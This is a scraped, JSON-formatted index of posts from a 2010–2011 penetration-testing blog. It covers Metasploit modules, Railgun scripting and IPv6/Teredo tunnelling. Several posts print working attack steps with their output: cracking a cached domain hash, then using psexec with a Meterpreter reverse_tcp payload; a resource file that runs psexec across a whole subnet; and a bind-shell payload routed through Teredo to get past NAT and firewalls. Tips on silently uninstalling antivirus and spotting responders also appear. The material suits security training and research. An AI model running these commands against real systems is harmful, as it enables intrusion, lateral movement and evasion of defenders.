Crack it: cat lab.dic | ./john --stdin lab.mscash --format=mscash --pot=lab.pot Loaded 1 password hash (M$ Cache Hash [Generic 1x]) ASDqwe123 (jdoe) guesses: 1 time: 0:00:00:00 c/s: 500 trying: ASDqwe123 Use it: meterpreter \u003e background msf exploit(handler) \u003e route add 10.10.10.0 255.255.255.0 1 msf exploit(handler) \u003e use exploit/windows/smb/psexec msf exploit(psexec) \u003e set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD =\u003e windows/meterpreter/reverse_tcp msf exploit(psexec) \u003e set LHOST X.X.X.X LHOST =\u003e X.X.X.X msf exploit(psexec) \u003e set LPORT 80 LPORT =\u003e 80 msf exploit(psexec) \u003e set SMBDomain Contoso SMBDomain =\u003e Contoso msf exploit(psexec) \u003e set SMBUser jdoe SMBUser =\u003e jdoe msf exploit(psexec) \u003e set SMBPass ASDqwe123 SMBPass =\u003e ASDqwe123 msf exploit(psexec) \u003e show options Module options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBDomain Contoso no The Windows domain to use for authentication SMBPass ASDqwe123 no The password for the specified username SMBUser jdoe no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique: seh, thread, none, process LHOST X.X.X.X yes The listen address LPORT 80 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf exploit(psexec) \u003e set RHOST 10.10.10.200 RHOST =\u003e 10.10.10.200 msf exploit(psexec) \u003e exploit [*] Started reverse handler on X.X.X.X:80 [*] Connecting to the server... [*] Authenticating to 10.10.10.200:445|Contoso as user 'jdoe'... [*] Uploading payload... [*] Created jSlxARUj.exe... [*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] ... [*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] ... [*] Obtaining a service manager handle... [*] Creating a new service (SyHtwKpn - \"MbEXNupOpYUL\")... [*] Closing service handle... [*] Opening service... [*] Starting the service... [*] Removing the service... [*] Closing service handle... [*] Deleting jSlxARUj.exe... [*] Meterpreter session 2 opened (X.X.X.X:80 -\u003e X.X.X.X:54430) at Mon Feb 14 22:23:00 +0000 2011 Woot ;-) ","date":"2011-02-14","objectID":"https://malicious.link/posts/2011/2011-02-14-cachedump-for-meterpreter-in-action/:0:0","tags":null,"title":"Cachedump for Meterpreter in action","uri":"https://malicious.link/posts/2011/2011-02-14-cachedump-for-meterpreter-in-action/"},{"categories":["update"],"content":"I thought updates went into RSS, but I guess they don’t so this is my “I updated stuff” post: /blog/2009/9/18/password-word-lists/ ","date":"2011-02-11","objectID":"https://malicious.link/posts/2011/2011-02-11-updated-password-and-word-lists/:0:0","tags":null,"title":"Updated: Password and Word lists","uri":"https://malicious.link/posts/2011/2011-02-11-updated-password-and-word-lists/"},{"categories":["internet"],"content":"Thought I would share this video, if it isn’t a swift kick in the pants to do better with your life I don’t what is: ","date":"2011-02-11","objectID":"https://malicious.link/posts/2011/2011-02-11-patch-adams/:0:0","tags":null,"title":"Patch Adams","uri":"https://malicious.link/posts/2011/2011-02-11-patch-adams/"},{"categories":["rant"],"content":" This day and age everyone is worried about the insider threat. Internal Penetration Testing doesn’t really test what would happen if your janitor got paid 50 bucks to put a USB stick in one of your servers. External Penetration Tests are never scoped for that sort of testing. So what is a company to do? How can they know what the risk is? The answer? Usually they guess or assume. Mostly because they are scared to find out, it’s happened to them before, or one of a million different justifications. I’ve got a webinar coming up to describe exactly this type of testing, but I thought I’d go into it a bit here. The FBI has a files upon files and stories stacked miles high about spies and insiders taking everything from accounting information (I could have put LIVES for effect but that’s more of a one-off) to staplers (no I don’t think Milton has an FBI file). Insiders throughout time have been the biggest threat to organizations even before sabotage and espionage became words. Ok, so what’s the big build up for? Simple. We need to build organizations up in the detection department from a pentesters point of view, not signature based. Our pentesters need to talk to our forensics guys, the incident responders need to talk to pentesters and every which way between. We are loosing this battle, and one of the reasons we are is we keep our bag of tricks to our selves, and that’s what insider threat testing is all about, getting all the tricks tested in a more open fashion. Can your organization see a command and control session via IRC? What if it’s pushed over port 80? What about a standard meterpreter reverse_tcp connection? There isn’t a money based solution for this, just like there isn’t for phishing. Added on to all of the other things your security team does, there needs to be an employee, or a consultant that it is on the phone with your team saying “did you see this?”. Sort of like the ‘Can you hear me now?’ test. I mean, have you ever met an incident response team that took time out of their day to see if they could get poison ivy (one of the most well known RATS /remote access tools/) through the firewall undetected? Probably, but when they came and told you about it you chastised them for it. In any case, I’ve jumped around roles in this post a lot and I want to focus it back on getting true collaborative testing done, but there has to be a balance. If you’re staring at a piece of earth, you’ll see the ant walk on by, but you’ll probably miss a half dozen of them on your way to check the mail. So how do you do this? Why not make it an educational process? Have the senior staff on the phone with the tester, and then tell the junior guys something like “We just had a breach and it’s starting exfil data to this IP: x.x.x.x”. Give them a chance to find it then work through with them where / what happened, and why or why not any alerts or alarms went of and if they saw it in their normal flow. Ideally they spot it before the senior staff even mention it. No, this will not fit into the ‘I give you report you give me money’ scenario. Companies should consider it a training exercise where they get instant and obvious benefit. There are many other arenas this helps in too. For example phishing, you know how much harder it will be for an attacker to get a payload to work if you’ve already tested, detected and have traps (we’ll go into setting traps another time) for all the public avenues of C\u0026C and exfiltration? They will get frustrated, and you’ll know that you’re being attacked. A proactive stance is what ’testing’ is all about, and this is a extremely neglected aspect of it. No one will solve ‘security’, all we are here to do is minimize the attack surface. Come to the webinar to heckle, learn, or just hear more, or don’t. I just wanted to get this out there and ask the question: Can your most important data leave on a fake Lady Gaga CD without you knowing? Update: Let me squash something real quick. No this is not a new idea. Th","date":"2011-01-27","objectID":"https://malicious.link/posts/2011/2011-01-27-insider-threat-testing/:0:0","tags":null,"title":"Insider Threat Testing","uri":"https://malicious.link/posts/2011/2011-01-27-insider-threat-testing/"},{"categories":["metasploit","delicious"],"content":"[UPDATE] This module (enum_delicious) has been pulled from Metasploit since Delicious no longer allows searching by site. In the last post I showed off how Archive.org’s Wayback machine can be used to pull urls for a domain, another place where URLs are stored and can be searched by domain is Delicious.com (a bookmarking service). I’ve seen people bookmark everything from internal web portals to urls with special no-auth passwords in them. It may even reveal subdomains and hosts you didn’t know about. This can be a very handy set of data. Be forewarned though, Delicious has been putting ads in the results and I haven’t gotten a solid regex to work on picking them out yet. So comb your results before slamming them in the requestor script from the last post. The module works basically the same way, but here it is in action: msf auxiliary(enum_delicious) \u003e info Name: Pull Del.icio.us Links (URLs) for a domain Version: 11107 License: Metasploit Framework License (BSD) Rank: Normal Provided by: Rob Fuller Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- DOMAIN yes Domain to request URLS for OUTFILE no Where to output the list for use Description: This module pulls and parses the URLs stored by Del.icio.us users for the purpose of replaying during a web assessment. Finding unlinked and old pages. msf auxiliary(enum_delicious) \u003e set DOMAIN portswigger.net DOMAIN =\u003e portswigger.net msf auxiliary(enum_delicious) \u003e run [*] Pulling urls from Delicious.com [*] Page number: 1 [*] Page number: 2 [*] Page number: 3 [*] Page number: 4 [*] Located 81 addresses for portswigger.net http://blog.portswigger.net/ http://blog.portswigger.net/2007/04/preventing-username-enumeration.html http://blog.portswigger.net/2007/04/using-recursive-grep-for-harvesting.html http://blog.portswigger.net/2007/05/on-site-request-forgery.html http://blog.portswigger.net/2007/06/viewstate-snooping.html http://blog.portswigger.net/2007/07/dns-pinning-and-web-proxies.html http://blog.portswigger.net/2007/07/hacking-without-credentials.html http://blog.portswigger.net/2007/07/lame-bugs-for-rainy-day.html http://blog.portswigger.net/2007/10/introducing-burp-sequencer.html http://blog.portswigger.net/2007/11/new-burp-beta.html http://blog.portswigger.net/2007/12/burp-suite-v11-released.html http://blog.portswigger.net/2008/03/book-review-ajax-security.html http://blog.portswigger.net/2008/03/xsrf-and-threat-ratings.html http://blog.portswigger.net/2008/04/can-you-hit-moving-target.html http://blog.portswigger.net/2008/05/burp-sequencer-101.html http://blog.portswigger.net/2008/05/null-byte-attacks-are-alive-and-well.html http://blog.portswigger.net/2008/08/attacking-parameter-names.html http://blog.portswigger.net/2008/08/problem-accepting-self-signed-ssl.html http://blog.portswigger.net/2008/11/mobp-burp-extender-extended.html http://blog.portswigger.net/2008/11/mobp-filtering-and-deleting-content.html http://blog.portswigger.net/2008/11/mobp-new-target-site-map.html http://blog.portswigger.net/2008/11/month-of-burp-pr0n.html http://blog.portswigger.net/2008/12/burp-suite-v12-released.html http://blog.portswigger.net/2008/12/when-good-xsrf-defence-turns-bad.html http://blog.portswigger.net/2009/04/intercepting-thick-client.html http://blog.portswigger.net/2009/04/using-burp-extender.html http://blog.portswigger.net/2009/11/if-politicians-were-http-status-codes.html http://blog.portswigger.net/2009/11/v13p-ssl-pain-relief.html http://blog.portswigger.net/2010/01/burp-suite-v13-released.html http://blog.portswigger.net/2010/06/comparing-web-application-scanners-part.html http://blog.portswigger.net/2010/06/comparing-web-application-scanners.html http://blog.portswigger.net/search/label/MoBP http://portswigger.net/ http://portswigger.net/books/ http://portswigger.net/burp/ http://portswigger.net/burp/downloadfree.html http://portswigger.net/burp/help/intruder.html http://portswigger.net/burp/help/proxy.html http://portswigger","date":"2010-12-25","objectID":"https://malicious.link/posts/2010/2010-12-25-delicious-webapp-hacking/:0:0","tags":null,"title":"Delicious Webapp Hacking","uri":"https://malicious.link/posts/2010/2010-12-25-delicious-webapp-hacking/"},{"categories":["wayback","metasploit"],"content":"Archive.org allows you to check the history of sites and pages, but a service most are not aware of is one that allows you to get a list of every page that a Archive.org has for a given domain. This is great for enumerating a web applications, many times you’ll find parts of web apps that have been long forgotten (and usually vulnerable). This module doesn’t make any requests to the targeted domain, it simply outputs a list to the screen/or a file of all the pages it has found on Archive.org. msf auxiliary(enum_wayback) \u003e info Name: Pull Archive.org stored URLs for a domain Version: 10394 License: Metasploit Framework License (BSD) Rank: Normal Provided by: Rob Fuller Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- DOMAIN portswigger.net yes Domain to request URLS for OUTFILE no Where to output the list for use Description: This module pulls and parses the URLs stored by Archive.org for the purpose of replaying during a web assessment. Finding unlinked and old pages. msf auxiliary(enum_wayback) \u003e run [*] Pulling urls from Archive.org [*] Located 289 addresses for portswigger.net http://portswigger.net/ http://portswigger.net/books/ http://portswigger.net/burp/ http://portswigger.net/burp/bullet.gif http://portswigger.net/burp/buy.html http://portswigger.net/burp/help.html http://portswigger.net/burp/ps.css http://portswigger.net/burp/screenshots.html http://portswigger.net/burp/tc.html http://portswigger.net/corner.gif **SNIPPED** You can set the OUTFILE so that you can parse it a bit and import it into Burp, or use a quick script to make the queries yourself. Here is one I wrote in python: # cat requestor.py #!/usr/bin/env python import urllib proxies = {'http': 'http://127.0.0.1:8080'} filename = \"/tmp/waybacklist.txt\" fl = open(filename, 'r') for lines in fl: url = str(lines) if len(url) \u003c 4: print \"Skipping blank line\" else: print \"Requesting \" + url temp = urllib.urlopen(url, proxies=proxies).read() Enjoy! ","date":"2010-12-24","objectID":"https://malicious.link/posts/2010/2010-12-24-wayback-webapp-hacking/:0:0","tags":null,"title":"Wayback Webapp Hacking","uri":"https://malicious.link/posts/2010/2010-12-24-wayback-webapp-hacking/"},{"categories":["honey pot","metasploit"],"content":"Most malicious IP lists focus on the client side threat, where servers (hosted or exploited) host client side exploits or evil scripting. These don’t really help the server admins very much. Project Honeypot does an amazing job at keeping detailed information on scanners / harvesters and brute forcers, the likes of which are the daily enemy of said admins. They offer a service called HTTP Block List or ‘HTTP:BL’. Another way this list differs from the rest is it isn’t a list you can download. Its a DNS service. Simply put, you submit a query, it gives an (A) record that looks something like ‘127.3.5.1’. Disregard the 127, but the rest of the details pertain to different details about the IP you requested. You can read the documentation here: http://www.projecthoneypot.org/httpbl_api.php for an explanation on exactly how it works, or you can read the code of the Metasploit module I wrote for it. I wrote it in Metasploit for 2 reasons. 1) RangeWalker is awesome code, and allows you to query a list of IPs, a range, or a single IP with ease. 2) All of the other implementations of the API that they have listed are for CMSs (to actively block IPs that come back ‘bad’). This will mostly come in useful for incident responders who are trying to get a bead on a bunch of hosts, or for web admins who want to pull the code out for an active blocking system of their own. Here it is in action: msf auxiliary(httpbl_lookup) \u003e info Name: Http:BL lookup Version: xxxx License: Metasploit Framework License (BSD) Rank: Normal Provided by: Rob Fuller Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- APIKEY xxxxxxxxxxxx yes Your HTTP:BL api key RHOSTS 88.229.108.0/24 yes The target address range or CIDR identifier THREADS 1 yes The number of concurrent threads Description: This module can be used to enumerate information about a IP addresses from Project HoneyPot's HTTP Block List. References: link (\u003ca href=\"http://www.projecthoneypot.org/httpbl_api.php\"\u003ehttp://www.projecthoneypot.org/httpbl_api.php\u003c/a\u003e) msf auxiliary(httpbl_lookup) \u003e run [*] [*] 88.229.108.0 resloves to 127.51.8.1 which means: Suspicious [*] =\u003e it was last seen 51 day ago and has a threat score of 8 or 'less than 100 spam messages' [*] =\u003e more info here: \u003ca href=\"http://www.projecthoneypot.org/ip_88.229.108.0\"\u003ehttp://www.projecthoneypot.org/ip_88.229.108.0\u003c/a\u003e [*] [*] 88.229.108.1 resloves to 127.29.8.1 which means: Suspicious [*] =\u003e it was last seen 29 day ago and has a threat score of 8 or 'less than 100 spam messages' [*] =\u003e more info here: \u003ca href=\"http://www.projecthoneypot.org/ip_88.229.108.1\"\u003ehttp://www.projecthoneypot.org/ip_88.229.108.1\u003c/a\u003e [*] [*] 88.229.108.2 resloves to 127.29.8.1 which means: Suspicious [*] =\u003e it was last seen 29 day ago and has a threat score of 8 or 'less than 100 spam messages' [*] =\u003e more info here: \u003ca href=\"http://www.projecthoneypot.org/ip_88.229.108.2\"\u003ehttp://www.projecthoneypot.org/ip_88.229.108.2\u003c/a\u003e [*] [*] 88.229.108.254 resloves to 127.51.8.1 which means: Suspicious [*] =\u003e it was last seen 51 day ago and has a threat score of 8 or 'less than 100 spam messages' [*] =\u003e more info here: \u003ca href=\"http://www.projecthoneypot.org/ip_88.229.108.254\"\u003ehttp://www.projecthoneypot.org/ip_88.229.108.254\u003c/a\u003e [*] [*] 88.229.108.255 resloves to 127.29.8.1 which means: Suspicious [*] =\u003e it was last seen 29 day ago and has a threat score of 8 or 'less than 100 spam messages' [*] =\u003e more info here: \u003ca href=\"http://www.projecthoneypot.org/ip_88.229.108.255\"\u003ehttp://www.projecthoneypot.org/ip_88.229.108.255\u003c/a\u003e [*] Scanned 256 of 256 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(httpbl_lookup) \u003e You can obtain the module here: https://github.com/mubix/stuff/blob/master/metasploit/httpbl_lookup.rb Enjoy! ","date":"2010-12-23","objectID":"https://malicious.link/posts/2010/2010-12-23-project-honeypot-http-blocklist-module/:0:0","tags":null,"title":"Project Honeypot HTTP Blocklist module","uri":"https://malicious.link/posts/2010/2010-12-23-project-honeypot-http-blocklist-module/"},{"categories":["novahackers","ssh","video"],"content":"This is definitely not my content, but I did want to highlight the talk Nicholas [1] gave at NoVA Hackers [2] this last November. Nicholas B. gives a talk about SSH Patching for Offensive and Defense at NoVa Hackers November 2010 [1] http://twitter.com/nberthaume [2] http://novahackers.blogspot.com/2010/10/november-meeting-monday-nov-15th-2010.html ","date":"2010-12-05","objectID":"https://malicious.link/posts/2010/2010-12-05-offensive-and-defensive-ssh-patching-at-nova-hackers/:0:0","tags":null,"title":"Offensive and Defensive SSH Patching at NoVA Hackers","uri":"https://malicious.link/posts/2010/2010-12-05-offensive-and-defensive-ssh-patching-at-nova-hackers/"},{"categories":["metasploit","meterpreter","symantec","sep"],"content":"Uninstallation is not new Deleting and removing things on a box you own isn’t new This method and how to do it remotely was posted in Feb 2007 But I didn’t know how to do it, and I thought it was hilarious, so I made a video: ","date":"2010-11-16","objectID":"https://malicious.link/posts/2010/2010-11-16-silently-uninstall-sep-html/:0:0","tags":null,"title":"Silently uninstall SEP","uri":"https://malicious.link/posts/2010/2010-11-16-silently-uninstall-sep-html/"},{"categories":["common sense","internet"],"content":"“There is no stupid question” but, if it doesn’t meet this checklist, it’s officially a time wasting one. Acceptable questions checklist: Have I tried it Have I checked the manual, wiki, or forum Have I googled and searched for an answer All marks must be achieved before a question is asked unless the target of the question is getting paid to answer the source’s inquires “Have I tried it” mark can only be skipped in the case of life threatening actions PDF version is available upon request. ","date":"2010-10-01","objectID":"https://malicious.link/posts/2010/2010-10-01-acceptable-questions-checklist/:0:0","tags":null,"title":"Acceptable Questions Checklist","uri":"https://malicious.link/posts/2010/2010-10-01-acceptable-questions-checklist/"},{"categories":["ipv6"],"content":" Revenge of the Bind Shell from Practical Exploitation on Vimeo. ","date":"2010-09-24","objectID":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/:0:0","tags":null,"title":"Revenge of the Bind Shell","uri":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/"},{"categories":["ipv6"],"content":"BACKGROUND At the April 2010 NoVA Hackers meeting I discussed some of the offensive uses of IPv6 on current networks. Well, around that time Microsoft issued a patch to all of the supported versions of Windows that broke my methodology. Obviously I wasn’t the only one doing this ;-) Before I get ahead of myself lets explain what Teredo is. Teredo is a tunneling service built in to Windows. It’s intent, as far as I can tell, was to allow anyone to have access to the IPv6 enabled internet, free, and dead simple, no infrastructure changes needed. You can get into much more detail on the Teredo TechNet article, but essentially an internal host is asking a Teredo server/relay for an IPv6 IP address. It does this over UDP and which by default in Windows points to teredo.ipv6.microsoft.com over port 3544 (UDP). When the tunnel is established, the host is given a 2001::/32 address. This address is a public IP. Before April this essentially meant that your Windows shares and any other listening service was publically available, despite your NAT and Firewall. This isn’t as much of a problem as you might think as it’s virtually impossible to guess or scan for an IPv6 address. So, unless you displayed it publically by connecting to Freenode or posting it online somewhere (via a demonstration video). You’re pretty safe. ","date":"2010-09-24","objectID":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/:1:0","tags":null,"title":"Revenge of the Bind Shell","uri":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/"},{"categories":["ipv6"],"content":"THE PATCH Microsoft made this a certainty when they issued the patch. I was unable to locate the specific one, or even identify for certain that it was April 2010, but that’s when the initial article for IPV6_PROTECTION_LEVEL was published. This is a socket level option that says, unless this flag is set to “PROTECTION_LEVEL_UNRESTRICTED” on the binary that is doing the communication, deny all traffic from NAT Traversals (Teredo). (Even Netcat6 doesn’t have this flag set!) Essentially, unless someone rebuilt their binary with the explicit intention to allow people to connect to it over NAT Traversals, the traffic was denied. You were still allowed to connect out, keeping in tact the initial idea for Teredo, but it broke my methodology damn it! I used Teredo to connect to the SMB server so that I could psexec a shell back any time I wanted before (still possible on non-patched systems) but since Microsoft doesn’t want to add the PROTECTION_LEVEL_UNRESTRICTED flag to SMB you have to just upload and use a binary that does. Luckily, with the help of Stephen Fewer, the bind_ipv6_tcp payload in Metasploit does. ","date":"2010-09-24","objectID":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/:2:0","tags":null,"title":"Revenge of the Bind Shell","uri":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/"},{"categories":["ipv6"],"content":"COMMANDS The commands used in the video are below: netsh interface ipv6 install netsh interface ipv6 set teredo enterpriseclient ./mspfayload windows/meterpreter/bind_ipv6_tcp LPORT=9001 X \u003e bind.exe The only thing that was behind the scenes was giving my Metasploit host an IPv6 address. I used Miredo (Teredo for *nix/OSX): # Install miredo apt-get install miredo #Remove it from starting automatically update-rc.d miredo -f remove ","date":"2010-09-24","objectID":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/:3:0","tags":null,"title":"Revenge of the Bind Shell","uri":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/"},{"categories":["ipv6"],"content":"PROTECTION Yes, it’s that easy. Now, some of the mitigating suggestions I’ve seen on the net is to blackhole the Microsoft Teredo server, or block the UDP port 3544. However, Miredo can act as a Teredo server/relay just fine, and can listen on any port you wish (53?). So unless you block ALL UDP outbound traffic, you are not protecting against this threat. ","date":"2010-09-24","objectID":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/:4:0","tags":null,"title":"Revenge of the Bind Shell","uri":"https://malicious.link/posts/2010/2010-09-24-revenge-of-the-bind-shell/"},{"categories":["firefox","forensics"],"content":"This is part one in a series of presentations I will be giving at the NoVAHackers meetings on forensics of all kinds as it can be leveraged in a penetration test. Memory Forensics for Pentesters: Firefox from Rob Fuller ","date":"2010-09-14","objectID":"https://malicious.link/posts/2010/2010-09-14-memory-forensics-for-pentesters-part-1/:0:0","tags":null,"title":"Memory Forensics for Pentesters: Part 1","uri":"https://malicious.link/posts/2010/2010-09-14-memory-forensics-for-pentesters-part-1/"},{"categories":["metasploit","meterpreter","railgun"],"content":"When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn’t have a way to quickly check this. You could drop to a shell, check the local users group “Adminitrators”, and check your user, and correlate any groups that are shared between the outputs. You could do ‘getsystem’ and if one works other than Kitrap0d. You could also just do a ‘ps’ and notice that you can see ‘SYSTEM’ processes. But, I wanted to make a way that check a bunch of sessions all at once. So I wrote “AmIAdmin.rb” which uses meterpreter’s railgun extension to execute “IsUserAdmin”. Being that Shell32.dll isn’t included in railgun by default we have to add it. After writing it I decided to add some checks. These checks make sure that each piece of the script isn’t already loaded. It’s a good reference for doing this in the future. (you can remove the print_status lines if you want the script to be quieter) Here is the script for your consumption: if client.platform == \"x64/win32\" print_status \"Railgun is currently not supported for x64 bit systems\" raise Rex::Script::Completed end if client.railgun.present? == true print_status \"Railgun already loaded.. skipping\" else print_status \"Loading Railgun\" client.core.use(\"railgun\") end if client.railgun.dll['shell32'] == nil print_status \"Adding Shell32.dll\" client.railgun.add_dll('shell32','shell32') else print_status \"Shell32 already loaded.. skipping\" end if (client.railgun.shell32.functions['IsUserAnAdmin'] == nil print_status \"Adding the IsUserAnAdmin function\" client.railgun.add_function('shell32', 'IsUserAnAdmin', 'BOOL', []) else print_status \"IsUserAnAdmin already loaded.. skipping\" end print_status \"Running the IsUserAnAdmin function\" status = client.railgun.shell32.IsUserAnAdmin() if status[\"return\"] == true then print_status \"You are an administrator\" else print_error \"You are not an administrator\" end ","date":"2010-09-13","objectID":"https://malicious.link/posts/2010/2010-09-13-am-i-an-admin-railgun-script/:0:0","tags":null,"title":"Am I an Admin? Railgun Script","uri":"https://malicious.link/posts/2010/2010-09-13-am-i-an-admin-railgun-script/"},{"categories":["metasploit","meterpreter","resource files","script"],"content":"Exploit modules inside of metasploit don’t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It’s really not much but there are some really juicy pieces of knowledge I learned on the way here. // The following is a resource file, but instead of just giving you something to download or straight copy and paste, I’ve broken it up into sections. Also take note of the “setg” which sets the variable globally so that I don’t have to set it inside of the psexec module. use multi/handler setg PAYLOAD windows/meterpreter/reverse_tcp setg LHOST 192.168.1.114 setg LPORT 80 set ExitOnSession false exploit -j -z This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn’t have to set up and tear down the handler. = fast. The following though is just the setup for the module. use windows/smb/psexec set SMBUser Administrator set SMBPass password123 Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren’t joined to a domain they can take pretty much anything here. However if they are actually joined to a domain, you either have to have the computer name (which definitely won’t play well with a scanner easily) or use domain credentials. set SMBDomain . The “.” is something every Windows API programmer would know as it’s really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won’t take either localhost or 127.0.0.1. Next up, we don’t want each run of the exploit module to build the multi/handler and tear it down every single run. That’s why we built it first and set DisablePayloadHandler inside of the psexec module. set DisablePayloadHandler true Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the \u003cruby\u003e html like block identifier you can then use the power of Ruby combined with Rex (Metasploit’s API) to do really cool stuff. More setup, but this time for the ruby portion. Using Metasploit’s RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the “file:” prefix. \u003cruby\u003e require 'rex/socket/range_walker' rhosts = \"192.168.92.0/24\" iplist = Rex::Socket::RangeWalker.new(rhosts) iplist.each do |rhost| So, we’ve included RangeWalker, parsed it, and loaded it into an ’each’ for loop. The self.run_single function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right? self.run_single(\"set RHOST #{rhost}\") self.run_single(\"exploit -j -z\") end \u003c/ruby\u003e That’s it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the “-z -j” just as we did with multi/handler. Now, if your credentials worked on any of the IPs you’ll have sessions waiting for you. This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!. Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of CTF competitions. ","date":"2010-09-12","objectID":"https://malicious.link/posts/2010/2010-09-12-rapid-fire-psexec-for-metasploit/:0:0","tags":null,"title":"Rapid fire PSEXEC for Metasploit","uri":"https://malicious.link/posts/2010/2010-09-12-rapid-fire-psexec-for-metasploit/"},{"categories":["metasploit"],"content":" Ask any developer and they will tell you that the age of a project is not calculated in calendar time, but in worker hours or “commits” to a project. The Metasploit Framework hit 10,000 today. With the project dating back to 2003, much before the official “Revision 1” happened, there have been a lot of changes. Going from the initial incarnation as a network “game” written in perl to the world largest ruby project, the framework has seen it’s fair share of blood, sweat, and tears. With Express out and Pro to come, there will definitely be 10,000 more. Congratulations to the team, both past and present. What you guys do is extraordinary. ","date":"2010-08-13","objectID":"https://malicious.link/posts/2010/2010-08-13-metasploit-turns-10000/:0:0","tags":null,"title":"Metasploit turns 10,000","uri":"https://malicious.link/posts/2010/2010-08-13-metasploit-turns-10000/"},{"categories":["iphone","jailbreak","rant"],"content":"Back in 2009 the “ikee” rick-rolling worm went around the iPhone world via the password of ‘alpine’ on the root account. You are now warned to change your root password when you pop into Cydia and Rock the first time. But this thing just wont stay down. If you have jailbroken your iPad you might want to check out a little file called “master.passwd”. In it, there is another user called ‘mobile’ which has been pointed out since 2008 (here) on the iPhone as another account to change the password of. But the media and Cydia/Rock warnings only put emphasis on ‘root’. Many iPad and iPhone apps STILL do not use the “keyring’” and store your password in plain text or somewhere in a binary file (still plaintext), which the user “mobile” has access to. Ok, “so what” you say. Since this recent jailbreak was using a website, the individuals running that site now have the IP address of freshly jailbroken iPhones and iPads. I am certainly not saying that they have any ill intentions, but sites have been broken into before, and that would be one hell of a gold mine. Hopefully AT\u0026T has put in blocks of some sort so that it’s customers are protected, but who knows what the other countries around the world that carry iPhones are doing. But at the very least, if you have jailbroken your iPhone, iPod Touch or iPad, please.. please set your passwords accordingly and do not have it a simple dictionary password. Remember, you ARE giving up some security when you jail break your phone. It is on you to make sure that you lock what you can back down. To change your password, use ‘Terminal’ and log in to one account at a time and issue the “passwd” command. You can also just log in to root and issue the “passwd mobile” command to change the password of mobile Update on 2010-08-09 19:39 by Rob Fuller I’ve gotten a lot of comments stating that OpenSSH isn’t installed by default and that this is not a big deal at all. A couple problems exist in that argument though: The Jailbreak is executing code on your phone/touch/ipad. Unless you do a analysis of the entire disk, you can’t be sure the jailbreak doesn’t leave some other way into the phone. Yes, that’s a far fetched chance, but most users would never know. Even if you don’t install it Out-of-the-box. There is a good possibility that you will OpenSSH at a later date. Better to get it fixed while you have it on the mind. ","date":"2010-08-04","objectID":"https://malicious.link/posts/2010/2010-08-04-jailbreak-ssh-horrors-strike-back/:0:0","tags":null,"title":"Jailbreak SSH horrors strike back","uri":"https://malicious.link/posts/2010/2010-08-04-jailbreak-ssh-horrors-strike-back/"},{"categories":["antivirus"],"content":"Ever set up a multi/handler and get an odd IP hitting it? Probably forgot about it as internet chatter? Think again, you might have just been caught AV Tracker - http://avtracker.info/ is a site that tracks the different IP addresses, hostnames, computer names and user agents that AV and other “Submit-your-malware-here” drop boxes use. Peter Kleissner and his team provide ranges that the hosts use a dynamic text file with the IP addresses listed if you want to add it to some auto updating block list a line by line IPTABLES block config and even C code to add into your binary to make sure it doesn’t talk out from one of those addresses (I could be reading it wrong, still a beginner in C) The team has been criticized a lot by AV vendors, enough so the took down the site in January of this year. But it came back June 5th. I use this site to help me know when the Incident Responders are on to me for my pen testing jobs. I do not wish to get in the debate of how a tool could be used. ","date":"2010-08-03","objectID":"https://malicious.link/posts/2010/2010-08-03-av-tracker/:0:0","tags":null,"title":"AV Tracker","uri":"https://malicious.link/posts/2010/2010-08-03-av-tracker/"},{"categories":["railgun","references"],"content":"Metasploit’s Railgun is awesome, but getting things to work correctly can be a pain. Here are some of the resources that have helped me out: System Error Codes - This is hands down the best resource you have, it will tell you what that stupid “5” or “1314” means in your return value. Keep this tab open to circumvent crazed bovine attacks. theForger’s Win32 API Programming Tutorial - A really good place to start when you are getting to know the Windows API and the frustrations that come along with it. I highly recommend going through it first. MS Windows API Reference - Gigantic, and not the easiest to navigate, but really good for knowing what calls were added with each version of Windows as well as a basic (alphabetic) list of calls. Good if you know where you are going. The Undocumented Functions - Win NT/2k/XP/2k3 - A really old link but has good references to undocumented functions that have helped circumvent some of the stupidity of other more complicated functions. WineAPI Documentation - A great resource of API calls that mimic the Microsoft ones (Undocumented and Documented). Hope this helps and I look forward to seeing what you come up with… ","date":"2010-08-03","objectID":"https://malicious.link/posts/2010/2010-08-03-resources-for-railgun-development/:0:0","tags":null,"title":"Resources for railgun development","uri":"https://malicious.link/posts/2010/2010-08-03-resources-for-railgun-development/"},{"categories":["metasploit","meterpreter","railgun"],"content":"Back on June 13th, “Patrick HVE” released RAILGUN: http://mail.metasploit.com/pipermail/framework/2010-June/006382.html And it was merged into 